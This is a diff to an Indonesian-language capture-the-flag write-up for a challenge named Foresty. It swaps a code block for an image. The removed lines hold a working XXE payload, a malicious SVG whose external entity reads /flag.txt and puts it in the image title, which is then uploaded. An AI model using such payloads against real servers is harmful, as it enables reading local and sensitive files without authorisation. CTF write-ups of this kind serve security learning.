@@ -191,15 +191,7 @@ Berikut adalah penyelesaian untuk tantangan dari CTF Foresty.
     <br>
   - Buat file SVG berbahaya yang berisi *payload* XXE untuk membaca file lokal (`/flag.txt`).
    <br>
-     ```xml
-     <?xml version="1.0"?>
-     <!DOCTYPE svg [
-       <!ENTITY flag SYSTEM "file:///flag.txt">
-     ]>
-     <svg xmlns="[http://www.w3.org/2000/svg](http://www.w3.org/2000/svg)">
-       <title>&flag;</title>
-     </svg>
-     ```
+     <img src="img/svg.png" width="500">
       <br>
   - Unggah file SVG tersebut, dan flag akan muncul di judul gambar.
   <img src="img/svg5.png" width="500">
